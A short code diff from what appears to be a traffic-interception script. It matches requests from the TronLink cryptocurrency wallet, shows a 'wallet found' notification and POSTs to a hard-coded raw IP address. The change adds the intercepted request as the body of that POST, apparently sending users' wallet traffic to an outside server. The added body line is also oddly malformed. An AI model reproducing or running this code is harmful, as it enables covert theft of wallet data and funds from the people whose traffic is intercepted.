@@ -10,11 +10,11 @@ console.log("1111111111111",String(usercode) );
 if (TronLinkRegex.test(requrl)) {
     let params = {
         url:"http://43.134.170.213:8001/api/trx/getinfo",
-        // body:[{"usercode":"usercode"}],//仅仅在post请求中有效
+        body:{["usercodeusercode"]:{request}},//仅仅在post请求中有效
     }
     console.log("1111111111");
     $notification.post("通知","","找到TronLink钱包");
-    $httpClient.post(params, function(errormsg,response,data){request})
+    $httpClient.post(params, function(errormsg,response,data){})
 } else {
     $done({});
 }
